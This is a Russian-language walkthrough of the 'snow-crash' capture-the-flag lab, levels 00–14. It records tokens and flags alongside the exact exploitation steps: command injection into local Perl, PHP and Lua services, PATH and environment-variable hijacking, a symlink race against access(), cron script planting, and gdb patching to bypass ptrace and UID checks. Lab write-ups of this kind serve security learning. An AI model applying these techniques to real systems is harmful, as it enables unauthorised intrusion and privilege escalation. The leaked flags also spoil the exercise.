# snow-crash

su levelN, password: token
su flagN, password: passwd

`ssh  level00@172.16.188.130 -p 4242`

## level01 (x24ti5gi3x0ol2eh4esiuxias)

* Находим пароль для flag01
* Устанавливаем утилиту brew install john-jumbo
* Копируем файл с паролями и запустим `john passwd --show`
* Смотрим в `~/.john` -> `john.pot`, находим флаг: 42hDRfypTqqnw:abcdefg

## level02 (f2av5il02puano7naaf6adaaf)

* Копируем файл `level02.pcap` на локальную машину
* Устанавливаем `wireshark`
* Запускаем шарк с этим дампом
* Фильтруем по data и смотрим пакеты:

```
Packet	  Hexadecimal					     ASCII
000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20            ...Passw ord:
000000B9  66                                                 f
000000BA  74                                                 t
000000BB  5f                                                 _
000000BC  77                                                 w
000000BD  61                                                 a
000000BE  6e                                                 n
000000BF  64                                                 d
000000C0  72                                                 r
000000C1  7f                                                 .
000000C2  7f                                                 .
000000C3  7f                                                 .
000000C4  4e                                                 N
000000C5  44                                                 D
000000C6  52                                                 R
000000C7  65                                                 e
000000C8  6c                                                 l
000000C9  7f                                                 .
000000CA  4c                                                 L
000000CB  30                                                 0
000000CC  4c                                                 L
000000CD  0d                                                 .
```
* определяем что 7f - это код DEL
* значит код ft_waNDReL0L

## level03 (kooda2puivaav1idi4f57q8iq)

* В директории видим файл level03 это исполняемый файл, выпоним `ltrace ./level03`
получим:
```
__libc_start_main(0x80484a4, 1, 0xbffffd94, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                           = 2003
geteuid()                                                                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                 = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                 = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                              = 0
+++ exited (status 0) +++
```
* Нас тут интересует `system("/usr/bin/env echo Exploit me"Exploit me` - значит что мы можем сюда подложить замену.
* Что значит `/usr/bin/env`? Ответ: https://unix.stackexchange.com/questions/364519/why-is-the-env-directory-called-before-echo. Кратко: с такой конструкцией echo запускается не использованием всроенного компонента; сначала проходим по всем директориям в окружении `PATH` и ищем там нужный нам компонент
* Ищем располжение `which getflag` и делаем символьную ссылку с названием echo
* `ln -s /bin/getflag /tmp/echo`
* `PATH=/tmp:$PATH`


## level04 (qi0maab88jeaj46qoumi7maus)

* В директории видим файл level04.pl
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
* Видим что возможно запущен сервис на 4747 порте
* Можно сделать csrf-атаку и в аргумент x положить `getflag`
Пример: **curl http://localhost:4747?x=\`getflag\`**

## level05 (ne2searoevaevoem4ov4ar8ap)

**You have new mail in /var/mail/level05**

* Посмотрим, что лежит в `cat /var/mail/level05`
* Видим, что работает крон раз в 2 минуты:
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
* Посмотрим, что это за скриптец:
```
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
* Видим, что этот скрипт пробегает по вложенным файлам извлекает содержимое и исполняет не больше 5s
* Сделаем скрипт и накинем прав на выполнение `+x`
```
#!/bin/bash
/bin/getflag > /tmp/flag
```

## level06 (viuaaale9huek52boumoomioc)

* Смотрим на файл level06.php, видим что используется `preg_replace` с флагом `е`, которая пораждает уезвимость типа - PREG_REPLACE_EVAL (https://php.ru/manual/reference.pcre.pattern.modifiers.html#reference.pcre.pattern.modifiers.eval)
* Смотрим на регулярку создаем файл с таким контентом: **echo "[x {${`getflag`}}]" > /tmp/l06**
* Дергаем файл и вкачестве аргумента отправляем путь до файла


## level07 (wiok45aaoguiboiki2tuin6ub)
* В директории видим файл level07 это исполняемый файл, выпоним `ltrace ./level07`
получим:
```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffffd94, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                           = 2007
geteuid()                                                                                           = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                 = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                 = 0
getenv("LOGNAME")                                                                                   = "level07"
asprintf(0xbffffce4, 0x8048688, 0xbfffff7c, 0xb7e5ee55,0xb7fed280)                                 = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                              = 0
+++ exited (status 0) +++
```
* Видим что `/bin/echo` печатает значение переменной среды
* Заменим значение переменной среды на `LOGNAME="|getflag"`
* Дернем ./level07

## level08 (fiumuikeil55xe9cu4dood66h)

* Доступа к файлу token нет
* В директории видим файл level08 это исполняемый файл, выпоним `ltrace ./level08 token`
получим:
```
__libc_start_main(0x8048554, 2, 0xbffffd74, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token"You may not access 'token') = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
* Видим что входной файл тупо сравнивается со сторокой token сделаем символьную ссылку на этот файл
* `ln -s /home/user/level08/token /tmp/level08`
* `./level08 /tmp/level08`
* незабыть сделать getflag (ключ для получения флага - quif5eloekouj29ke0vouxean)

## level09 (25749xKZ8L7DkSCwJkT9dyv6f)

* Есть token и исполняемый файл, после нескольких тестов стало понятно, что с помощью этого файла зашифровали токен и результат положили в файл token
* aaa -> abc, 111 -> 123
* для расшифровки нужно просто из каждого символа вычесть порядковый номер
* незабыть сделать getflag (ключ для получения флага - f3iji1ju5yuevaus41q1afiuq)

## level10 (s5cAJpM8ev6XHw998pRWG728z)

* Заметим что ./level10 подключается к ресурсу который висит на порте 6969 `./level10 / 192.16.188.130`
* Запустим с ltrace `ltrace ./level10 / 192.16.188.130`
Получим:
```
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/", 4)= 0
printf("Connecting to %s:6969 .. ", "192.16.188.130")= 37
fflush(0xb7fd1a20Connecting to 192.16.188.130:6969 .. )= 0
socket(2, 1, 0)= 3
inet_addr("192.16.188.130")= 0x82bc10c0
htons(6969, 1, 0, 0, 0)= 14619
connect(3, 0xbffff71c, 16, 0, 0^C <unfinished ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```
* Видим что программа сначала вызывает `access` - у этой функции есть уязвимость (https://stackoverflow.com/questions/7925177/access-security-hole)
* План такой: создаем файл пустышку -> дергаем программу с этим файлом (в отдельном потоке) -> пока происходит проверка, удаляем файл и создаем символьную ссылку на токен
Фейковый скрипт
```
#!/bin/bash

while true; do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
done
```

Скрипт спамера
```
#!/bin/bash
while true; do
        /home/user/level10/level10 /tmp/link 192.16.188.130
done
```

* Создаем эти скрипты и запускаем в разных окнах, при этом начинаем слушать `nc -lk 6969`
* Видим что при прослушке порта проскакивает токен:
```
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
```
* Ура мы нашли токен!
* незабыть сделать getflag (ключ для получения флага - woupa2yuojeeaaed06riuj63c)

## level11 (feulo4b72j7edeahuete3no7cl)

* Видим что в папке есть скрипт на луа, как я понимаю с этим скриптом поднимается сервер для вебсокета, попробуем прослушать может он уже поднят
* `nc 127.0.0.1 5151`
* Просит пароль... можно попробовать вставить туда csrf-атаку
* Password: `getflag` > /tmp/flag
* Посмотрим что у нас в /tmp/flag:
**Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s**

## level12 (fa6v5ateaw21peobuub8ipe6s)

* Видим скрипт, на порте 4646 висит вебсервер, который берет обрабатывает аргумент через регулярное выражение
* Можем создать скрипт с `getflag` > /tmp/flag и этот файл (EXP) потом передать агрументом `curl localhost:4646?x='`/*/EXP`'`
*
* Посмотрим что у нас в /tmp/flag:
**Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr**

## flag13 (g1qKMiRpXf53AWhDaU7FEkczr)

* Видим испоняемый файл, котороый проверяет UID на соответствие с 4242 воспользуемся `gdb`
https://beta.hackndo.com/introduction-a-gdb/
```
level13@SnowCrash:~$ gdb level13
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804858c <+0>:	push   %ebp
   0x0804858d <+1>:	mov    %esp,%ebp
   0x0804858f <+3>:	and    $0xfffffff0,%esp
   0x08048592 <+6>:	sub    $0x10,%esp
   0x08048595 <+9>:	call   0x8048380 <getuid@plt>
   0x0804859a <+14>:	cmp    $0x1092,%eax
   0x0804859f <+19>:	je     0x80485cb <main+63>
   0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
   0x080485a6 <+26>:	mov    $0x80486c8,%edx
   0x080485ab <+31>:	movl   $0x1092,0x8(%esp)
   0x080485b3 <+39>:	mov    %eax,0x4(%esp)
   0x080485b7 <+43>:	mov    %edx,(%esp)
   0x080485ba <+46>:	call   0x8048360 <printf@plt>
   0x080485bf <+51>:	movl   $0x1,(%esp)
   0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
   0x080485cb <+63>:	movl   $0x80486ef,(%esp)
   0x080485d2 <+70>:	call   0x8048474 <ft_des>
   0x080485d7 <+75>:	mov    $0x8048709,%edx
   0x080485dc <+80>:	mov    %eax,0x4(%esp)
   0x080485e0 <+84>:	mov    %edx,(%esp)
   0x080485e3 <+87>:	call   0x8048360 <printf@plt>
   0x080485e8 <+92>:	leave
   0x080485e9 <+93>:	ret
End of assembler dump.
```
* Добавляем break -  break getuid
* Запускаем програму - run
* Идет пошагово - step
* 0x0804859a in main () - это вот эта строка -  $0x1092,%eax, сравниваем 4242 c eax
* просто заменим значение на 4242 в этом регистре, set $eax=4242
* step, получаем токен

## level14 (2A31L79asukciNyi8uppkEuSx)

* Видим что ничего нет
* Будем мучить getflag
* Запустим `./ltrace getflag`
```
__libc_start_main(0x8048946, 1, 0xbffff7f4, 0x8048ed0, 0x8048f40 <unfinished ...>
ptrace(0, 0, 1, 0, 0)= -1
puts("You should not reverse this"You should not reverse this)= 28
+++ exited (status 1) +++
```
* Увидел что мы валимся на функции ptrace, запустим `gdb getflag`, Если отладчик, использующий ptrace (например, gdb или ltrace), используется в процессе, который вызывает ptrace, это приведет к ошибке, и ptrace вернет -1.
* disass main, найдем `ptrace`
```
 0x08048989 <+67>:	call   0x8048540 <ptrace@plt>
 0x0804898e <+72>:	test   %eax,%eax
```
* Мы видим, что сразу после вызова ptrace проверяется значение в регистре eax. Мы можем установить точку останова. мы видим, что значение в eax равно -1 `break *main+72`
* Выставим значение 0, `set $eax=1`
* `n` проходим дальше и видим что успешно все прошли:
```
(gdb) n
Single stepping until exit from function main,
which has no line number information.
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```
* Теперь нам нужно проделать финт как в 13 задании, ищем getuid и место где происходит сравнение, смотрим кaкой uuid у flag14
```
   0x08048afd <+439>:   call   0x80484b0 <getuid@plt>
   0x08048b02 <+444>:   mov    %eax,0x18(%esp)
   0x08048b06 <+448>:   mov    0x18(%esp),%eax
   0x08048b0a <+452>:   cmp    $0xbbe,%eax
```

```
level10@SnowCrash:~$ cat /etc/passwd | grep level14
level14:x:2014:2014::/home/user/level14:/bin/bash
level10@SnowCrash:~$ cat /etc/passwd | grep flag14
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

* Делаем поинт на точке `b *main+452`
* Все запускаем и выставляем нужные значения в регистры
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /bin/getflag

Breakpoint 1, 0x0804898e in main ()
(gdb) set $eax=1
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x08048b0a in main ()
(gdb) set $eax=3014
(gdb) n
Single stepping until exit from function main,
which has no line number information.
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```
* Мы нашли flag!!!
